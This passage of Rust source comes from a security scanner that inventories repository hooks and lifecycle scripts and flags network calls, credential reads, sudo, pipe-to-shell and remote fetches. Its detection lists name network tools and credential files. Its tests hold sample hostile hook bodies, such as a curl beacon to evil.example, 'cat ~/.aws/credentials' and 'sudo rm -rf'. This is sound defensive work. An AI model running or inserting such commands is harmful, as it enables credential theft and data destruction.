            .or_else(|| repo_name.starts_with("https://").then_some(repo_name));
        let hooks = value_for_key(repo, "hooks")
            .ok_or_else(|| "pre-commit repository has no hook list".to_string())?;
        let serde_yaml::Value::Sequence(hooks) = hooks else {
            return Err("pre-commit repository hook list is not a sequence".to_string());
        };
        for hook in hooks {
            let serde_yaml::Value::Mapping(hook) = hook else {
                return Err("pre-commit hook definition is not a mapping".to_string());
            };
            let stages = match value_for_key(hook, "stages") {
                Some(value) => parse_stages(value)?,
                None => default_stages.clone(),
            };
            let entry = match value_for_key(hook, "entry") {
                Some(value) => Some(
                    value
                        .as_str()
                        .ok_or_else(|| "pre-commit hook entry is not a string".to_string())?,
                ),
                None => None,
            };
            if repo_name == "local" && entry.is_none() {
                return Err("local pre-commit hook has no executable entry".to_string());
            }
            let body = [remote, entry]
                .into_iter()
                .flatten()
                .collect::<Vec<_>>()
                .join("\n");
            for stage in stages {
                entries.push((stage, body.clone()));
            }
        }
    }
    Ok(entries)
}

/// Security-relevant `package.json` install/rebuild/pack/publish lifecycle
/// scripts, each as its own entry (no Git event). A malformed manifest is
/// present but uninspectable and therefore fails closed for package-manager
/// lifecycle commands.
fn collect_package_json(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let path = repo_root.join("package.json");
    let contents = match read_text(&path, repo_root) {
        ReadOutcome::Text(c) => c,
        // Present but blocked: inventory under the package.json provider so an
        // `npm install` leader scan still surfaces a symlinked / oversized manifest
        // instead of treating it as absent.
        ReadOutcome::Unreadable(reason) => {
            push_unreadable_entry(
                out,
                "package.json".to_string(),
                HookProvider::PackageJson,
                path,
                Vec::new(),
                &reason,
            );
            return;
        }
        ReadOutcome::Absent => return,
    };
    let value = match serde_json::from_str::<serde_json::Value>(&contents) {
        Ok(value) => value,
        Err(_) => {
            push_unreadable_entry(
                out,
                "package.json".to_string(),
                HookProvider::PackageJson,
                path,
                Vec::new(),
                "package manifest is not valid JSON",
            );
            return;
        }
    };
    let Some(scripts) = value.get("scripts").and_then(|s| s.as_object()) else {
        return;
    };
    const LIFECYCLE: &[&str] = &[
        "preinstall",
        "install",
        "postinstall",
        "prepublish",
        "preprepare",
        "prepare",
        "postprepare",
        "prepack",
        "postpack",
        "prepublishOnly",
        "publish",
        "postpublish",
        "pretest",
        "test",
        "posttest",
    ];
    for key in LIFECYCLE {
        if let Some(cmd) = scripts.get(*key).and_then(|v| v.as_str()) {
            push_entry(
                out,
                (*key).to_string(),
                HookProvider::PackageJson,
                path.clone(),
                cmd.to_string(),
                Vec::new(),
            );
        }
    }
}

/// `.envrc` (direnv) — auto-sourced on `cd` after `direnv allow`. Whole file is the body.
fn collect_direnv(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let path = repo_root.join(".envrc");
    let contents = match read_text(&path, repo_root) {
        ReadOutcome::Text(c) => c,
        // Present but blocked: inventory the `.envrc` so a `direnv allow` leader scan
        // still surfaces a symlinked / oversized `.envrc` instead of dropping it.
        ReadOutcome::Unreadable(reason) => {
            push_unreadable_entry(
                out,
                ".envrc".to_string(),
                HookProvider::Direnv,
                path,
                Vec::new(),
                &reason,
            );
            return;
        }
        ReadOutcome::Absent => return,
    };
    push_entry(
        out,
        ".envrc".to_string(),
        HookProvider::Direnv,
        path,
        contents,
        Vec::new(),
    );
}

/// mise/asdf tool hooks (`mise.toml`, `.mise.toml`, `.tool-versions`). Reported under
/// "automation" per the spec (not auto-scanned per package command).
fn collect_mise(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let surfaces: &[(&str, HookProvider)] = &[
        ("mise.toml", HookProvider::Mise),
        (".mise.toml", HookProvider::Mise),
        (".tool-versions", HookProvider::Mise),
    ];
    collect_named_surfaces(repo_root, surfaces, out);
}

/// Automation task runners (`Makefile`, `justfile`, `Taskfile.yml`) — inventory only.
fn collect_automation(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let surfaces: &[(&str, HookProvider)] = &[
        ("Makefile", HookProvider::Makefile),
        ("makefile", HookProvider::Makefile),
        ("justfile", HookProvider::Justfile),
        ("Justfile", HookProvider::Justfile),
        ("Taskfile.yml", HookProvider::Taskfile),
        ("Taskfile.yaml", HookProvider::Taskfile),
    ];
    collect_named_surfaces(repo_root, surfaces, out);
}

/// Read each `(relative_name, provider)` surface under `repo_root`, deduplicated by
/// canonical path — matters on case-insensitive filesystems where `Makefile`/`makefile`
/// resolve to the same file and would otherwise be inventoried twice.
fn collect_named_surfaces(
    repo_root: &Path,
    surfaces: &[(&str, HookProvider)],
    out: &mut Vec<RepoHookEntry>,
) {
    let mut seen: Vec<PathBuf> = Vec::new();
    for (rel, provider) in surfaces {
        let path = repo_root.join(rel);
        let outcome = read_text(&path, repo_root);
        // Absent surfaces are genuinely not there — skip without touching dedup.
        if matches!(outcome, ReadOutcome::Absent) {
            continue;
        }
        // Canonicalize for the dedup key; fall back to the literal path. Applies to
        // the unreadable case too, so a case-insensitive FS doesn't inventory
        // `Makefile`/`makefile` twice.
        let canon = path.canonicalize().unwrap_or_else(|_| path.clone());
        if seen.contains(&canon) {
            continue;
        }
        seen.push(canon);
        let name = path
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or(rel)
            .to_string();
        match outcome {
            ReadOutcome::Text(contents) => {
                push_entry(out, name, *provider, path, contents, Vec::new());
            }
            // Present but blocked: inventory so a symlinked / oversized task-runner or
            // mise/asdf surface is flagged rather than silently dropped.
            ReadOutcome::Unreadable(reason) => {
                push_unreadable_entry(out, name, *provider, path, Vec::new(), &reason);
            }
            ReadOutcome::Absent => unreachable!("absent handled above"),
        }
    }
}

/// Build + classify an entry (the five rules over its body) and append it to `out`.
fn push_entry(
    out: &mut Vec<RepoHookEntry>,
    name: String,
    provider: HookProvider,
    source_path: PathBuf,
    body: String,
    git_events: Vec<String>,
) {
    let category = provider.category();
    let location = source_path.display().to_string();
    let findings = classify_body(&name, provider, &location, &body);
    out.push(RepoHookEntry {
        name,
        category,
        provider,
        source_path,
        body,
        git_events,
        findings,
    });
}

/// Run the five repo-hook rules over a hook body, High rules first so the most severe
/// finding is listed first.
fn classify_body(
    name: &str,
    provider: HookProvider,
    location: &str,
    body: &str,
) -> Vec<RepoHookFinding> {
    let mut out = Vec::new();
    if body.trim().is_empty() {
        return out;
    }
    let command_facts = hook_command_facts(body);

    let mk = |rule_id: RuleId, severity: Severity, detail: String| RepoHookFinding {
        rule_id,
        severity,
        name: name.to_string(),
        provider,
        location: location.to_string(),
        detail,
    };

    if command_facts.analysis_incomplete {
        out.push(mk(
            RuleId::AnalysisIncomplete,
            Severity::High,
            "hook command body contains an ambiguous or over-depth executable body; automatic execution is blocked until it can be inspected"
                .to_string(),
        ));
    }

    // Rule 1 — network call (High): curl/wget/nc/ncat/netcat as a command word.
    if let Some(tool) = body_network_tool(&command_facts) {
        out.push(mk(
            RuleId::RepoHookNetworkCall,
            Severity::High,
            format!("hook body invokes `{tool}` (network call)"),
        ));
    }

    // Rule 2 — credential read (High): references a well-known credential path.
    if let Some(target) = body_reads_credential(body) {
        out.push(mk(
            RuleId::RepoHookCredentialRead,
            Severity::High,
            format!("hook body references credential path `{target}`"),
        ));
    }

    // Rule 3 — sudo (High): a `sudo` command word.
    if command_facts.saw_sudo || command_facts.commands.contains("sudo") {
        out.push(mk(
            RuleId::RepoHookSudo,
            Severity::High,
            "hook body uses `sudo` (privilege escalation)".to_string(),
        ));
    }

    // Rule 4 — suspicious shell pattern (Medium): pipe-to-interpreter / base64-decode-exec.
    if let Some(detail) = body_suspicious_shell_pattern(body, &command_facts) {
        out.push(mk(
            RuleId::RepoHookSuspiciousShellPattern,
            Severity::Medium,
            detail,
        ));
    }

    // Rule 5 — external fetch (Medium): npx / pnpm dlx / a bare URL handed to a fetcher.
    // Mutually exclusive with Rule 1 — skip when the curl/wget High path already fired.
    let network_call_fired = out.iter().any(|f| f.rule_id == RuleId::RepoHookNetworkCall);
    if !network_call_fired {
        if let Some(detail) = body_external_fetch(body, &command_facts) {
            out.push(mk(RuleId::RepoHookExternalFetch, Severity::Medium, detail));
        }
    }

    out
}

/// Network tools a hook body must not silently invoke. Returns the first match.
fn body_network_tool(facts: &HookCommandFacts) -> Option<&'static str> {
    const TOOLS: &[&str] = &["curl", "wget", "nc", "ncat", "netcat"];
    TOOLS
        .iter()
        .find(|&&tool| facts.commands.contains(tool))
        .copied()
}

#[derive(Default)]
struct HookCommandFacts {
    commands: BTreeSet<String>,
    package_fetch_runners: BTreeSet<String>,
    saw_sudo: bool,
    piped_interpreters: BTreeSet<String>,
    analysis_incomplete: bool,
}

/// Recover executable command words using the same quote-aware tokenizer and
/// wrapper resolver as the runtime engine. Literal quoting, escaping, path
/// prefixes, simple quote concatenation, environment assignments, wrappers,
/// and executable command substitutions are normalized before classification;
/// words in comments or ordinary arguments are not treated as commands.
fn hook_command_facts(body: &str) -> HookCommandFacts {
    let mut facts = HookCommandFacts::default();
    let (shell, unsupported_runtime) = hook_body_shell(body);
    facts.analysis_incomplete |= unsupported_runtime;
    collect_hook_command_facts(body, shell, &mut facts, 0);
    facts
}

fn hook_body_shell(body: &str) -> (crate::tokenize::ShellType, bool) {
    let Some(shebang) = body.lines().next().filter(|line| line.starts_with("#!")) else {
        return (crate::tokenize::ShellType::Posix, false);
    };
    let shebang = shebang.to_ascii_lowercase();
    if shebang.contains("pwsh") || shebang.contains("powershell") {
        return (crate::tokenize::ShellType::PowerShell, false);
    }
    if shebang.contains("cmd.exe") || shebang.ends_with("/cmd") {
        return (crate::tokenize::ShellType::Cmd, false);
    }
    if shebang.contains("fish") {
        return (crate::tokenize::ShellType::Fish, false);
    }
    if shebang
        .split(|character: char| character.is_ascii_whitespace() || matches!(character, '/' | '\\'))
        .any(|runtime| matches!(runtime, "sh" | "bash" | "dash" | "zsh" | "ksh" | "busybox"))
    {
        return (crate::tokenize::ShellType::Posix, false);
    }
    // A Python/Node/Ruby/etc. hook is executable, but shell tokenization cannot
    // prove its command sinks. Preserve recoverable signals and fail closed.
    (crate::tokenize::ShellType::Posix, true)
}

fn collect_hook_command_facts(
    body: &str,
    shell: crate::tokenize::ShellType,
    facts: &mut HookCommandFacts,
    depth: usize,
) {
    if body.len() > MAX_HOOK_BODY_SIZE as usize {
        facts.analysis_incomplete = true;
        return;
    }
    let execution_view = crate::extract::shell_execution_view(body, shell);
    for segment in crate::tokenize::tokenize(execution_view.as_ref(), shell) {
        let direct = segment
            .command
            .as_deref()
            .map(|command| crate::rules::command::normalize_cmd_base(command, shell))
            .unwrap_or_default();
        facts.saw_sudo |= direct == "sudo";

        let (effective, saw_sudo) =
            match crate::rules::command::resolve_effective_command(&segment, shell) {
                Ok(effective) => (effective.segment, effective.saw_sudo),
                Err(_) => {
                    if segment.command.is_some() {
                        facts.analysis_incomplete = true;
                    }
                    (segment.clone(), direct == "sudo")
                }
            };
        facts.saw_sudo |= saw_sudo;
        let command = effective
            .command
            .as_deref()
            .map(|command| crate::rules::command::normalize_cmd_base(command, shell))
            .unwrap_or_default();
        if !command.is_empty() {
            facts.commands.insert(command.clone());
            // Fetch-and-run classification is the shared npm grammar's job, so
            // a form this scanner recognizes is exactly a form the threat
            // extractor recognizes. `pnpm exec` / `yarn exec` run something
            // already on disk and are deliberately not fetches.
            if let Some(launcher) = crate::npm_command::NpmLauncher::from_basename(&command) {
                let args: Vec<String> = effective
                    .args
                    .iter()
                    .map(|arg| crate::rules::command::normalize_shell_token(arg, shell))
                    .collect();
                let invocation = crate::npm_command::parse_resolved(launcher, &args);
                if invocation.fetches_remote_package() {
                    facts
                        .package_fetch_runners
                        .insert(invocation.runner_label());
                }
            }
            if matches!(
                segment.preceding_separator.as_deref(),
                Some("|") | Some("|&")
            ) && (crate::rules::command::INTERPRETERS.contains(&command.as_str())
                || matches!(command.as_str(), "nodejs" | "powershell"))
            {
                facts.piped_interpreters.insert(command);
            }
        }
    }

    let scan = crate::extract::executable_substitution_scan(body, shell);
    facts.analysis_incomplete |= scan.gap.is_some();
    if depth >= 8 {
        facts.analysis_incomplete |= !scan.bodies.is_empty();
        return;
    }
    for nested in scan.bodies {
        collect_hook_command_facts(&nested.input, nested.shell, facts, depth + 1);
    }
}

/// Credential-path fragments a hook body must not read. Returns the first match.
fn body_reads_credential(body: &str) -> Option<String> {
    // Specific sub-paths/filenames: a plain substring match is safe (distinctive enough).
    const SPECIFIC: &[&str] = &[
        ".aws/credentials",
        ".aws/config",
        ".ssh/id_",
        ".netrc",
        ".npmrc",
        ".pypirc",
        ".docker/config.json",
        ".kube/config",
        ".git-credentials",
        ".config/gh/hosts.yml",
    ];
    for frag in SPECIFIC {
        if body.contains(frag) {
            return Some((*frag).to_string());
        }
    }
    // Bare roots: match only at a path boundary so `.env` doesn't fire on `.environment`
    // and `.ssh`/`.aws` don't fire on `mydir.sshconfig` (see `references_bare_root`).
    const BARE_ROOTS: &[&str] = &[".aws", ".ssh", ".env"];
    for frag in BARE_ROOTS {
        if references_bare_root(body, frag) {
            return Some((*frag).to_string());
        }
    }
    None
}

/// `true` when `frag` (a bare credential root like `.env`/`.ssh`) appears in `body` as a
/// path component (boundary before; `/`, whitespace, quote, EOS, or `.` after). Avoids the
/// `.environment` / `.sshconfig` false positive a plain `contains` would hit.
fn references_bare_root(body: &str, frag: &str) -> bool {
    let bytes = body.as_bytes();
    let flen = frag.len();
    let mut idx = 0;
    while let Some(rel) = body[idx..].find(frag) {
        let pos = idx + rel;
        let before_ok = pos == 0
            || matches!(
                bytes[pos - 1],
                b' ' | b'\t'
                    | b'|'
                    | b';'
                    | b'&'
                    | b'('
                    | b'`'
                    | b'='
                    | b'\n'
                    | b'/'
                    | b'"'
                    | b'\''
                    | b'$'
                    | b'~'
            );
        let after = pos + flen;
        let after_ok = after >= bytes.len()
            || matches!(
                bytes[after],
                b'/' | b' '
                    | b'\t'
                    | b'|'
                    | b';'
                    | b'&'
                    | b')'
                    | b'`'
                    | b'\n'
                    | b'\r'
                    | b'"'
                    | b'\''
                    | b'.'
            );
        if before_ok && after_ok {
            return true;
        }
        idx = pos + 1;
        if idx >= body.len() {
            break;
        }
    }
    false
}

/// Detect a pipe-to-interpreter or base64-decode-then-exec pattern (first match).
fn body_suspicious_shell_pattern(body: &str, facts: &HookCommandFacts) -> Option<String> {
    if let Some(word) = facts.piped_interpreters.iter().next() {
        return Some(format!("hook body pipes into interpreter `{word}`"));
    }
    // base64 decode then execute: `base64 -d` / `--decode`.
    if facts.commands.contains("base64")
        && (body.contains("-d") || body.contains("--decode") || body.contains("-D"))
    {
        return Some("hook body decodes base64 content (possible obfuscated payload)".to_string());
    }
    if facts.commands.contains("eval") {
        return Some("hook body uses `eval` (dynamic code execution)".to_string());
    }
    None
}

/// Detect an external fetch via a non-curl/wget downloader: `npx`/`pnpm dlx` of a remote
/// package, or a bare URL handed to a fetch helper/config.
fn body_external_fetch(body: &str, facts: &HookCommandFacts) -> Option<String> {
    // A bare http(s):// URL anywhere is an external resource (Medium; curl/wget is Rule 1).
    if let Some(url) = first_external_url(body) {
        return Some(format!("hook body references external URL `{url}`"));
    }
    // `npx <pkg>` / `pnpm|yarn dlx <pkg>` / npm exec / bunx fetch and run
    // package code. These are command+subcommand facts; an ordinary `echo dlx`
    // argument is deliberately not executable evidence.
    if let Some(tool) = facts.package_fetch_runners.iter().next() {
        return Some(format!(
            "hook body fetches + runs a remote package via `{tool}`"
        ));
    }
    None
}

/// First `http(s)://` URL in `body`, truncated for display. Used by the external-fetch rule.
fn first_external_url(body: &str) -> Option<String> {
    for scheme in ["https://", "http://"] {
        if let Some(pos) = body.find(scheme) {
            let rest = &body[pos..];
            let end = rest
                .find(|c: char| c.is_whitespace() || c == '"' || c == '\'' || c == '`' || c == ')')
                .unwrap_or(rest.len());
            let url = &rest[..end];
            if url.len() > scheme.len() {
                let truncated: String = url.chars().take(80).collect();
                return Some(truncated);
            }
        }
    }
    None
}

/// Known git lifecycle event names (used by the lefthook parser and per-leader targeting).
const GIT_EVENTS: &[&str] = &[
    "applypatch-msg",
    "pre-commit",
    "prepare-commit-msg",
    "commit-msg",
    "post-commit",
    "pre-push",
    "pre-rebase",
    "post-checkout",
    "post-merge",
    "post-rewrite",
    "pre-merge-commit",
    "post-applypatch",
    "pre-applypatch",
    "post-index-change",
    "reference-transaction",
    "sendemail-validate",
    "fsmonitor-watchman",
    "pre-auto-gc",
    "p4-changelist",
    "p4-prepare-changelist",
    "p4-post-changelist",
    "p4-pre-submit",
    "pre-receive",
    "update",
    "proc-receive",
    "post-receive",
    "post-update",
    "push-to-checkout",
];

/// Largest hook / automation body we read. A hook script or task-runner file is
/// human-authored — 256 KiB is far past any real one, while bounding a hostile or
/// symlinked-to-huge surface so a later verbatim `explain` emit can't be abused as
/// an arbitrary-size disclosure channel.
const MAX_HOOK_BODY_SIZE: u64 = 256 * 1024;

/// Outcome of reading a hook / automation body, distinguishing a genuinely
/// ABSENT surface (skip it) from a PRESENT-but-blocked one (must still be
/// inventoried as a High uninspectable finding, never silently dropped — a
/// surface hidden behind a symlink is exactly the one a scan must not miss).
enum ReadOutcome {
    /// The file does not exist (`ENOENT`) — genuinely not a surface here.
    Absent,
    /// Present but could not be read into a classifiable body: a symlinked final
    /// component, an intermediate-dir symlink escaping `repo_root`, an oversized
    /// body, a non-regular file, a permission/IO error, or non-UTF-8 content.
    /// Carries a short reason for the High uninspectable finding.
    Unreadable(String),
    /// The body text, ready to classify / inventory.
    Text(String),
}

/// Read a hook / automation body as UTF-8 text, REFUSING to follow a symlink and
/// REFUSING to read outside `repo_root`. Distinguishes [`ReadOutcome::Absent`]
/// (missing file) from [`ReadOutcome::Unreadable`] (present but blocked: dirs,
/// perms, non-regular files, a symlinked final component, an oversized body, or
/// any path resolving outside `repo_root` via an intermediate-dir symlink
/// redirecting `.git`/`.husky` elsewhere). NEVER panics.
///
/// The body is emitted verbatim by `tirith hooks explain` (credential-redacted
/// only), so a followed symlink here would disclose an arbitrary file's contents —
/// hence `O_NOFOLLOW` (final component) + [`crate::util::canonical_within`]
/// (intermediate dirs) + a size cap. A non-UTF-8 body is [`ReadOutcome::Unreadable`]
/// (handled gracefully, never a panic), preserving the prior "non-UTF-8 →
/// unreadable" contract so callers surface it as a High finding rather than
/// dropping the surface.
fn read_text(path: &Path, repo_root: &Path) -> ReadOutcome {
    // Reject an intermediate-directory symlink that redirects the read outside the
    // repo (O_NOFOLLOW below only guards the final component). A non-existent path
    // also fails containment, so distinguish absent from blocked first.
    if !crate::util::canonical_within(path, repo_root) {
        return match path.symlink_metadata() {
            // The path simply isn't there — genuinely absent.
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => ReadOutcome::Absent,
            // It exists (or its existence is otherwise observable) but resolves
            // outside the repo — a present-but-blocked surface.
            _ => ReadOutcome::Unreadable("path escapes repository root".to_string()),
        };
    }
    match crate::util::read_text_no_follow_capped(path, MAX_HOOK_BODY_SIZE) {
        Ok(bytes) => match String::from_utf8(bytes) {
            Ok(text) => ReadOutcome::Text(text),
            // A non-UTF-8 body is "unreadable" (the prior contract); surfaces as the
            // High uninspectable finding rather than being dropped.
            Err(_) => ReadOutcome::Unreadable("non-UTF-8 content".to_string()),
        },
        Err(crate::util::OpenRegularError::NotFound) => ReadOutcome::Absent,
        Err(crate::util::OpenRegularError::NotRegularFile) => {
            // A symlinked final component (ELOOP) maps here, as do FIFO/device/dir.
            ReadOutcome::Unreadable("symlink or non-regular file".to_string())
        }
        Err(crate::util::OpenRegularError::TooLarge) => {
            ReadOutcome::Unreadable("body exceeds size cap".to_string())
        }
        Err(crate::util::OpenRegularError::Io(_)) => {
            ReadOutcome::Unreadable("permission denied or I/O error".to_string())
        }
    }
}

/// Build a name→entries map for callers that want grouped lookups.
pub fn index_by_name(entries: &[RepoHookEntry]) -> BTreeMap<String, Vec<RepoHookEntry>> {
    let mut map: BTreeMap<String, Vec<RepoHookEntry>> = BTreeMap::new();
    for e in entries {
        map.entry(e.name.clone()).or_default().push(e.clone());
    }
    map
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    fn rule_ids(scan: &RepoHookScan) -> Vec<RuleId> {
        scan.all_findings().iter().map(|f| f.rule_id).collect()
    }

    fn write(root: &Path, rel: &str, body: &str) {
        let path = root.join(rel);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }
        std::fs::write(path, body).unwrap();
    }

    fn mkgit(root: &Path) {
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
    }

    fn git_ok(root: &Path, args: &[&str]) -> Vec<u8> {
        let args = args
            .iter()
            .map(|arg| (*arg).to_string())
            .collect::<Vec<_>>();
        let output = run_trusted_git(root, &args, 1024 * 1024)
            .expect("the regression fixture requires trusted system Git");
        assert!(
            output.success,
            "trusted Git fixture command failed: {args:?}, code={:?}",
            output.code
        );
        output.stdout
    }

    fn init_real_git_repo(root: &Path) {
        git_ok(root, &["init", "-q"]);
        git_ok(
            root,
            &["config", "user.email", "tirith-tests@example.invalid"],
        );
        git_ok(root, &["config", "user.name", "Tirith Tests"]);
        write(root, "README.md", "initial\n");
        git_ok(root, &["add", "--", "."]);
        git_ok(root, &["commit", "-q", "-m", "initial"]);
    }

    fn current_branch(root: &Path) -> String {
        String::from_utf8(git_ok(root, &["symbolic-ref", "--short", "HEAD"]))
            .unwrap()
            .trim()
            .to_string()
    }

    #[test]
    fn rule_network_call_fires_high_on_husky_curl() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example/beacon\n",
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookNetworkCall)
            .expect("expected network-call finding");
        assert!(f.is_high());
        assert!(f.detail.contains("curl"));
        assert_eq!(f.provider, HookProvider::Husky);
    }

    #[test]
    fn rule_credential_read_fires_high() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        write(
            root.path(),
            ".git/hooks/pre-push",
            "#!/bin/sh\ncat ~/.aws/credentials\n",
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookCredentialRead)
            .expect("expected credential-read finding");
        assert!(f.is_high());
        assert!(f.detail.contains(".aws"));
    }

    #[test]
    fn rule_sudo_fires_high() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\nsudo rm -rf /var/cache\n",
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookSudo)
            .expect("expected sudo finding");
        assert!(f.is_high());
    }

    #[test]
    fn quoted_escaped_and_path_commands_are_classified_as_executed() {
        for body in [
            "'curl' https://evil.example/x",
            "\"curl\" https://evil.example/x",
            "/usr/bin/c\"ur\"l https://evil.example/x",
            "c\\url https://evil.example/x",
            "command 'curl' https://evil.example/x",
        ] {
            let findings =
                classify_body("pre-commit", HookProvider::Husky, ".husky/pre-commit", body);
            assert!(
                findings
                    .iter()
                    .any(|finding| finding.rule_id == RuleId::RepoHookNetworkCall),
                "an executed quoted/escaped curl must be High-classified: {body:?} -> {findings:?}"
            );
        }

        for body in ["'sudo' true", "\"su\"'do' true", "env -- sudo true"] {
            let findings =
                classify_body("pre-commit", HookProvider::Husky, ".husky/pre-commit", body);
            assert!(
                findings
                    .iter()
                    .any(|finding| finding.rule_id == RuleId::RepoHookSudo),
                "an executed quoted/wrapped sudo must be High-classified: {body:?} -> {findings:?}"
            );
        }
    }

    #[test]
    fn command_names_in_arguments_and_comments_are_not_executable_words() {
        for body in [
            "echo 'curl https://evil.example/x'",
            "printf '%s\\n' sudo",
            "# 'curl' https://evil.example/x\necho safe",
        ] {
            let findings =
                classify_body("pre-commit", HookProvider::Husky, ".husky/pre-commit", body);
            assert!(
                findings.iter().all(|finding| !matches!(
                    finding.rule_id,
                    RuleId::RepoHookNetworkCall | RuleId::RepoHookSudo
                )),
                "non-executed words must not become High command findings: {body:?} -> {findings:?}"
            );
        }
    }

    #[test]
    fn ambiguous_and_overdepth_hook_execution_fails_closed_high() {
        let dynamic = classify_body(
            "pre-commit",
            HookProvider::Git,
            ".git/hooks/pre-commit",
            r#"sh -c "$HOOK_COMMAND""#,
        );
        assert!(dynamic.iter().any(|finding| {
            finding.rule_id == RuleId::AnalysisIncomplete && finding.severity == Severity::High
        }));

        let mut nested = "curl https://evil.example/deep".to_string();
        for _ in 0..10 {
            nested = format!("echo \"$({nested})\"");
        }
        let overdepth = classify_body(
            "pre-commit",
            HookProvider::Git,
            ".git/hooks/pre-commit",
            &nested,
        );
        assert!(overdepth.iter().any(|finding| {
            finding.rule_id == RuleId::AnalysisIncomplete && finding.severity == Severity::High
        }));
    }

    #[test]
    fn hook_shebang_selects_shell_or_fails_closed_for_unsupported_runtime() {
        for body in [
            "#!/usr/bin/env pwsh\nc`url https://evil.example/pwsh\n",
            "#!cmd.exe /c\r\nc^url https://evil.example/cmd\r\n",
        ] {
            let findings = classify_body(
                "pre-commit",
                HookProvider::Git,
                ".git/hooks/pre-commit",
                body,
            );
            assert!(findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::RepoHookNetworkCall));
        }

        let unsupported = classify_body(
            "pre-commit",
            HookProvider::Git,
            ".git/hooks/pre-commit",
            "#!/usr/bin/env python3\nimport requests\n",
        );
        assert!(unsupported.iter().any(|finding| {
            finding.rule_id == RuleId::AnalysisIncomplete && finding.severity == Severity::High
        }));
    }

    #[test]
    fn rule_suspicious_shell_pattern_fires_medium_on_pipe_to_sh() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncat payload.txt | sh\n",
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookSuspiciousShellPattern)
            .expect("expected suspicious-shell finding");
        assert_eq!(f.severity, Severity::Medium);

        for interpreter in ["fish", "pwsh", "powershell", "powershell.exe"] {
            let body = format!("#!/bin/sh\nprintf payload | {interpreter}\n");
            let findings = classify_body(
                "pre-commit",
                HookProvider::Git,
                ".git/hooks/pre-commit",
                &body,
            );
            assert!(findings.iter().any(|finding| {
                finding.rule_id == RuleId::RepoHookSuspiciousShellPattern
                    && finding
                        .detail
                        .contains(interpreter.trim_end_matches(".exe"))
            }));
        }
    }

    #[test]
    fn rule_suspicious_shell_pattern_fires_on_base64_decode() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\necho aGVsbG8= | base64 --decode > /tmp/x\n",
        );
        let scan = scan_for_repo(root.path());
        // The pipe-to-base64 is not an interpreter pipe, but the base64 --decode
        // pattern fires the suspicious-shell rule.
        assert!(
            rule_ids(&scan).contains(&RuleId::RepoHookSuspiciousShellPattern),
            "base64 --decode should fire the suspicious-shell rule: {:?}",
            rule_ids(&scan)
        );
    }

    #[test]
    fn rule_external_fetch_fires_medium_on_npx() {
        let root = tempdir().unwrap();
        // postinstall via npx, no curl/wget (so external-fetch Medium, not the High rule).
        write(
            root.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"npx some-remote-tool@latest setup"}}"#,
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookExternalFetch)
            .expect("expected external-fetch finding");
        assert_eq!(f.severity, Severity::Medium);
        assert_eq!(f.provider, HookProvider::PackageJson);

        for body in [
            "pnpm dlx remote-tool",
            "yarn dlx remote-tool",
            "npm exec remote-tool",
            "npm x remote-tool",
            "bunx remote-tool",
            "bun x remote-tool",
        ] {
            let findings = classify_body(
                "postinstall",
                HookProvider::PackageJson,
                "package.json",
                body,
            );
            assert!(findings
                .iter()
                .any(|finding| finding.rule_id == RuleId::RepoHookExternalFetch));
        }
        let clean = classify_body(
            "postinstall",
            HookProvider::PackageJson,
            "package.json",
            "echo dlx exec x bunx",
        );
        assert!(!clean
            .iter()
            .any(|finding| finding.rule_id == RuleId::RepoHookExternalFetch));
    }

    #[test]
    fn curl_url_fires_network_call_not_external_fetch() {
        // curl+URL is the High path; external-fetch (Medium) must NOT also fire (mutually
        // exclusive — both fired previously).
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example/beacon\n",
        );
        let scan = scan_for_repo(root.path());
        let ids = rule_ids(&scan);
        assert!(
            ids.contains(&RuleId::RepoHookNetworkCall),
            "curl must fire the network-call rule: {ids:?}"
        );
        assert!(
            !ids.contains(&RuleId::RepoHookExternalFetch),
            "external-fetch must NOT double-fire alongside network-call: {ids:?}"
        );
    }

    #[test]
    fn rule_external_fetch_fires_on_envrc_url() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".envrc",
            "source_url https://example.test/setup.sh sha\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            rule_ids(&scan).contains(&RuleId::RepoHookExternalFetch),
            "a URL in .envrc should fire external-fetch: {:?}",
            rule_ids(&scan)
        );
    }

    #[test]
    fn benign_hook_has_no_findings() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\nnpm test\nnpx lint-staged\n",
        );
        // npx fires external-fetch by design; use a hook with no fetch/network/cred/sudo.
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\nnpm run lint\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            scan.all_findings().is_empty(),
            "a benign `npm run lint` hook must not fire: {:?}",
            rule_ids(&scan)
        );
    }

    #[test]
    fn credential_read_env_word_boundary_no_false_positive() {
